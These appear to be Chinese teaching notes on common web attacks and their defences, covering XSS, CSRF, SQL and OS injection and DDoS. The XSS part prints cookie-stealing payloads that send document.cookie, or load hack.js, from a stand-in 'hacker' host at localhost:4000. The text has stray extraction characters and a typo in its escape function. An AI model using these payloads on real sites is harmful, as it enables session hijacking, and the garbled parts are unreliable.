еёёи§ҒWebж”»еҮ»¶

з»ҹи®ЎдҝЎжҒҜпјҡеӯ—ж•° 15049 йҳ…иҜ»31еҲҶй’ҹ

иҜҫе ӮвҪ¬ж Ү¶

жҺҢжҸЎXSS (е®һж–Ҫ + йҳІеҫЎ)

жҺҢжҸЎCSRF (е®һж–Ҫ + йҳІеҫЎ)

жҺҢжҸЎзӮ№еҮ»еҠ«жҢҒ (е®һж–Ҫ + йҳІеҫЎ)

жҺҢжҸЎSQLжіЁвјҠ (е®һж–Ҫ + йҳІеҫЎ)

жҺҢжҸЎOSжіЁвјҠ (е®һж–Ҫ + йҳІеҫЎ)

дәҶи§ЈиҜ·жұӮеҠ«жҢҒ

дәҶи§ЈDDOS

зҹҘиҜҶиҰҒзӮ№¶

1гҖҒXSS¶

XSS ж”»еҮ»зҡ„еҹәжң¬йҖ»иҫ‘пјҡеңЁ URL дёӯжҸ’е…ҘдёҖж®ө script и„ҡжң¬пјҢз„¶еҗҺи„ҡжң¬зҡ„ src и®ҫзҪ®жҲҗеҸҰдёҖдёӘзҪ‘еқҖпјҲй»‘е®ўзҪ‘еқҖпјүжҲ–иҖ…и®ҫзҪ®дёҖж®ө JS д»Јз ҒпјҢз„¶еҗҺжҸ’е…ҘдёҖеј еӣҫзүҮпјҢеӣҫзүҮзҡ„ src дёӯеҢ…жӢ¬еҪ“еүҚз”ЁжҲ·зҡ„зҷ»еҪ•дҝЎжҒҜпјҲdocument.cookieпјүиҝҷж ·еңЁй»‘е®ўе№іеҸ°дёҠеҸҜд»ҘиҺ·еҸ–еҲ°з”ЁжҲ·зҡ„ cookieпјҢз„¶еҗҺеҸҜд»ҘзӣҙжҺҘзҷ»еҪ•з”ЁжҲ·зҡ„иҙҰжҲ·гҖӮеӣҫзүҮйҖҡеёёдјҡеҠ иҪҪпјҢжүҖд»ҘеҶҷе…ҘеӣҫзүҮзҡ„ src дёӯгҖӮ <img src="http://localhost:4000?test:${document.cookie}"/> зұ»дјјиҝҷж ·зҡ„и„ҡжң¬гҖӮ

й»‘е®ўеҸ‘з»ҷеҲ«дәәдёҖдёӘзҪ‘еқҖпјҢз„¶еҗҺзӮ№еҮ»зҪ‘еқҖиҝӣе…Ҙзҡ„з•ҢйқўдёӯпјҢе°ұеҸҜиғҪжңүйқһжі•зҡ„и„ҡжң¬гҖӮ

Cross Site Scripting и·Ёз«ҷи„ҡжң¬ж”»еҮ»

XSS (Cross-Site Scripting)пјҢи·Ёз«ҷи„ҡжң¬ж”»еҮ»пјҢеӣ дёәзј©еҶҷе’Ң CSSйҮҚеҸ пјҢжүҖд»ҘеҸӘиғҪеҸ« XSSгҖӮи·Ёз«ҷи„ҡжң¬ж”» еҮ»жҳҜжҢҮйҖҡиҝҮеӯҳеңЁе®үе…ЁжјҸпҘҺжҙһпЁ…зҡ„WebвҪ№зҪ‘з«ҷжіЁеҶҢвҪӨжҲ·зҡ„жөҸи§ҲеҷЁпЁёеҶ…иҝҗвҫҸвҫ®йқһжі•зҡ„вҫ®йқһжң¬з«ҷзӮ№HTMLж ҮзӯҫжҲ– JavaScriptиҝӣвҫҸзҡ„вјҖдёҖз§Қж”»еҮ»гҖӮ

var img = new Image();
img.src = 'http://localhost:4000/img?c=' + document.cookie;

еҠ е…Ҙиҝҷж®өд»Јз ҒеҗҺпјҢдјҡе°ҶжөҸи§ҲеҷЁзҡ„ cookie иҺ·еҸ–еҲ°пјҢз„¶еҗҺеӣҫзүҮдјҡиҜ·жұӮ 4000 з«ҜеҸЈпјҲй»‘е®ўз«ҜеҸЈпјүеҸҜд»Ҙи§ЈжһҗдёҖдёӢиҺ·еҸ–еҲ° cookieпјҢй»‘е®ўе°ұеҸҜд»ҘиҝӣиЎҢжӯЈеёёзҡ„зҷ»еҪ•дәҶ

localhost:3000/?from=<script%20src="http://localhost:4000/hack.js"></script>

и·Ёз«ҷи„ҡжң¬ж”»еҮ»жңүеҸҜиғҪйҖ жҲҗд»ҘдёӢеҪұе“Қ:

еҲ©п§қвҪӨиҷҡеҒҮиҫ“вјҠиЎЁеҚ•йӘ—еҸ–вҪӨжҲ·дёӘвјҲдәәдҝЎжҒҜгҖӮ

п§қвҪӨи„ҡжң¬зӘғеҸ–вҪӨжҲ·зҡ„CookieеҖјпјҢиў«е®іиҖ…еңЁпҘ§зҹҘжғ…зҡ„жғ…еҶөдёӢпјҢеё®еҠ©ж”»еҮ»иҖ…еҸ‘йҖҒжҒ¶ж„ҸиҜ·жұӮгҖӮ

жҳҫзӨәдјӘйҖ зҡ„вҪӮз« жҲ–еӣҫзүҮгҖӮ

ctx.set('X-XSS-Protection', 0) // зҰҒвҪҢжӯўXSSиҝҮж»Ө
// http://localhost:3000/?from=<script>alert(3)</script> еҸҜд»ҘжӢҰжҲӘ дҪҶдјӘиЈ…дёҖдёӢе°ұдёҚвҫҸ дәҶ

еҗҜвҪӨXSSиҝҮж»ӨгҖӮ еҰӮжһңжЈҖжөӢеҲ°и·Ёз«ҷи„ҡжң¬ж”»еҮ»пјҢжөҸи§ҲеҷЁпЁёе°Ҷжё…йҷӨв»ҡйЎөвҫҜйқўе№¶дҪҝвҪӨCSP report-uri жҢҮд»Өзҡ„еҠҹ иғҪеҸ‘йҖҒиҝқи§„жҠҘе‘ҠгҖӮ

CSP¶

еҶ…е®№е®үе…Ёзӯ–з•ҘпҘ¶ (CSP, Content Security Policy) жҳҜвјҖдёҖдёӘйҷ„еҠ зҡ„е®үе…ЁеұӮпјҢвҪӨдәҺеё®еҠ©жЈҖжөӢе’Ңзј“и§Јжҹҗ дәӣзұ»еһӢзҡ„ж”»еҮ»пјҢеҢ…жӢ¬и·Ёз«ҷи„ҡжң¬ (XSS) е’Ңж•°жҚ®жіЁвјҠзӯүж”»еҮ»гҖӮ иҝҷдәӣж”»еҮ»еҸҜвҪӨдәҺе®һзҺ°д»Һж•°жҚ®зӘғеҸ–еҲ° вҪ№зҪ‘з«ҷз ҙеқҸжҲ–дҪңдёәжҒ¶ж„ҸиҪҜд»¶еҲҶеҸ‘зүҲжң¬зӯүвҪӨйҖ”гҖӮ

CSP жң¬иҙЁдёҠе°ұжҳҜе»әвҪҙз«ӢвҪ©еҗҚеҚ•пјҢејҖеҸ‘иҖ…жҳҺзЎ®е‘ҠиҜүжөҸи§ҲеҷЁпЁёе“ӘдәӣеӨ–йғЁиө„жәҗеҸҜд»ҘеҠ иҪҪе’Ңжү§вҫҸгҖӮжҲ‘д»¬еҸӘ йңҖиҰҒй…ҚзҪ®и§„еҲҷпјҢеҰӮдҪ•жӢҰжҲӘжҳҜз”ұжөҸи§ҲеҷЁпЁёвҫғиҮӘвј°е·ұе®һзҺ°зҡ„гҖӮжҲ‘д»¬еҸҜд»ҘйҖҡиҝҮиҝҷз§ҚвҪ…ејҸжқҘе°ҪйҮҸпҘҫеҮҸе°‘ XSS ж”» еҮ»гҖӮ

// еҸӘе…Ғи®ёеҠ иҪҪжң¬з«ҷиө„жәҗ
Content-Security-Policy: default-src 'self'

// еҸӘе…Ғи®ёеҠ иҪҪ HTTPS еҚҸи®®еӣҫвҪҡ

function escape(str) {
  str = str.replace(/&/g, '&amp;')
  str = str.replace(/</g, '&lt;')
  str = str.replace(/>/g, '&gt;')
  str = str.replace(/"/g, '&quto;')
  str = str.replace(/'/g, '&#39;')
  str = str.replace(/`/g, '&#96;')
  str = str.replace(/\//g, '&#x2F;')
  return str
}

CSRF(Cross Site Request Forgery)пјҢеҚіи·Ёз«ҷиҜ·жұӮдјӘйҖ пјҢжҳҜвјҖдёҖз§Қеёёв»…и§Ғзҡ„Webж”»еҮ»пјҢе®ғеҲ©вҪӨвҪӨжҲ·е·Ізҷ»еҪ•зҡ„иә«д»ҪпјҢеңЁвҪӨжҲ·жҜ«дёҚзҹҘжғ…зҡ„жғ…еҶөдёӢпјҢд»ҘвҪӨжҲ·зҡ„еҗҚд№үе®ҢжҲҗвҫ®жі•ж“ҚдҪңгҖӮ

  • вҪӨжҲ·е·Із»Ҹзҷ»еҪ•дәҶз«ҷзӮ№ AпјҢе№¶еңЁжң¬ең°и®°еҪ•дәҶ cookie
  • еңЁвҪӨжҲ·жІЎжңүзҷ»еҮәз«ҷзӮ№ A зҡ„жғ…еҶөдёӢ(д№ҹе°ұжҳҜ cookie вҪЈз”ҹж•Ҳзҡ„жғ…еҶөдёӢ)пјҢи®ҝй—®дәҶжҒ¶ж„Ҹж”»еҮ»иҖ…жҸҗдҫӣзҡ„еј•иҜұеҚұйҷ©з«ҷзӮ№ B (B з«ҷзӮ№иҰҒжұӮи®ҝй—®з«ҷзӮ№A)гҖӮ
  • з«ҷзӮ№ A жІЎжңүеҒҡд»»дҪ• CSRF йҳІеҫЎ

еҜ№иҝӣвјҠж•°жҚ®еә“зҡ„зү№ж®Ҡеӯ—з¬Ұ('пјҢ"пјҢ\пјҢ<пјҢ>пјҢ&пјҢ*пјҢ; зӯү)иҝӣвҫҸиҪ¬д№үеӨ„зҗҶпјҢжҲ–зј–з ҒиҪ¬жҚўгҖӮеҹәжң¬дёҠжүҖжңүзҡ„еҗҺз«ҜиҜӯвҫ”иЁҖйғҪжңүеҜ№еӯ—з¬ҰдёІпӨ…иҝӣвҫҸиҪ¬д№үеӨ„зҗҶзҡ„вҪ…жі•пјҢвҪҗжҜ”еҰӮ lodash зҡ„ lodash._escapehtmlchar еә“гҖӮ

OSе‘Ҫд»ӨжіЁвјҠе’ҢSQLжіЁвјҠе·®дёҚпҘ§еӨҡпјҢеҸӘдёҚпҘ§иҝҮSQLжіЁвјҠжҳҜй’ҲеҜ№ж•°жҚ®еә“зҡ„пјҢвҪҪиҖҢOSе‘Ҫд»ӨжіЁвјҠжҳҜй’ҲеҜ№ж“ҚдҪңзі»з»ҹзҡ„гҖӮOSе‘Ҫд»Ө жіЁвјҠж”»еҮ»жҢҮйҖҡиҝҮWebеә”вҪӨпјҢжү§вҫҸвҫ®йқһжі•зҡ„ж“ҚдҪңзі»з»ҹе‘Ҫд»ӨиҫҫеҲ°ж”»еҮ»зҡ„вҪ¬зӣ®зҡ„гҖӮеҸӘиҰҒеңЁиғҪи°ғвҪӨShellеҮҪж•°зҡ„ең°вҪ…е°ұжңү еӯҳеңЁиў«ж”»еҮ»зҡ„в»ӣйЈҺйҷ©гҖӮеҖҳиӢҘи°ғвҪӨShellж—¶еӯҳеңЁз–ҸжјҸпҘҺпјҢе°ұеҸҜд»Ҙжү§вҫҸжҸ’вјҠзҡ„вҫ®йқһжі•е‘Ҫд»ӨгҖӮ

  • DNSеҠ«жҢҒ йЎҫеҗҚжҖқд№үпјҢDNSжңҚеҠЎеҷЁпЁё(DNSи§Јжһҗеҗ„дёӘжӯҘйӘӨ)иў«зҜЎж”№пјҢдҝ®ж”№дәҶеҹҹеҗҚи§Јжһҗзҡ„з»“жһңпјҢдҪҝеҫ—и®ҝй—®еҲ°зҡ„дёҚпҘ§жҳҜйў„жңҹзҡ„ip

distributed denial of service

DDOS дёҚпҘ§жҳҜвјҖдёҖз§Қж”»еҮ»пјҢвҪҪиҖҢжҳҜвјҖдёҖвјӨеӨ§зұ»ж”»еҮ»зҡ„жҖ»з§°гҖӮе®ғжңүвјҸеҮ вј—еҚҒз§Қзұ»еһӢпјҢж–°зҡ„ж”»еҮ»вҪ…жі•иҝҳеңЁдёҚпҘ§ж–ӯеҸ‘жҳҺеҮәжқҘгҖӮвҪ№зҪ‘ з«ҷиҝҗвҫҸзҡ„еҗ„дёӘзҺҜиҠӮпјҢйғҪеҸҜд»ҘжҳҜж”»еҮ»вҪ¬зӣ®ж ҮгҖӮеҸӘиҰҒжҠҠвјҖдёҖдёӘзҺҜиҠӮж”»з ҙпјҢдҪҝеҫ—ж•ҙдёӘжөҒзЁӢи·‘дёҚпҘ§иө·жқҘпјҢе°ұиҫҫеҲ°дәҶзҳ«з—Ә жңҚеҠЎзҡ„вҪ¬зӣ®зҡ„гҖӮ

е…¶дёӯпјҢвҪҗжҜ”иҫғеёёв»…и§Ғзҡ„вјҖдёҖз§Қж”»еҮ»жҳҜ cc ж”»еҮ»гҖӮе®ғе°ұжҳҜз®ҖеҚ•зІ—жҡҙпЁҶең°йҖҒжқҘвјӨеӨ§йҮҸпҘҫжӯЈеёёзҡ„иҜ·жұӮпјҢи¶…еҮәжңҚеҠЎеҷЁпЁёзҡ„жңҖвјӨеӨ§жүҝ еҸ—йҮҸпҘҫпјҢеҜјиҮҙе®•жңәгҖӮжҲ‘йҒӯйҒҮзҡ„е°ұжҳҜ cc ж”»еҮ»пјҢжңҖеӨҡзҡ„ж—¶еҖҷе…Ёдё–з•ҢвјӨеӨ§жҰӮ20еӨҡдёӘ IP ең°еқҖиҪ®жөҒеҸ‘еҮәиҜ·жұӮпјҢжҜҸдёӘең° еқҖзҡ„иҜ·жұӮйҮҸпҘҫеңЁжҜҸз§’200ж¬Ў~300ж¬ЎгҖӮжҲ‘зңӢи®ҝй—®вҪҮж—Ҙеҝ—зҡ„ж—¶еҖҷпјҢе°ұи§үеҫ—йӮЈдәӣиҜ·жұӮеғҸжҙӘвҪ”ж°ҙвјҖдёҖж ·ж¶ҢжқҘпјҢвјҖдёҖзңЁзңје°ұжҳҜ вјҖдёҖвјӨеӨ§е ҶпјҢвјҸеҮ еҲҶй’ҹзҡ„ж—¶й—ҙпјҢвҪҮж—Ҙеҝ—вҪӮж–Үд»¶зҡ„дҪ“з§Ҝе°ұвјӨеӨ§дәҶ100MBгҖӮиҜҙе®һиҜқпјҢиҝҷеҸӘиғҪз®—вј©ж”»еҮ»пјҢдҪҶжҳҜжҲ‘зҡ„дёӘвјҲдәәвҪ№зҪ‘з«ҷ жІЎжңүд»»дҪ•йҳІжҠӨпјҢжңҚеҠЎеҷЁпЁёиҝҳжҳҜи·ҹе…¶д»–вјҲдәәе…ұдә«зҡ„пјҢиҝҷз§ҚжөҒйҮҸпҘҫвјҖдёҖжқҘвҪҙз«ӢеҲ»е°ұдёӢзәҝдәҶгҖӮ
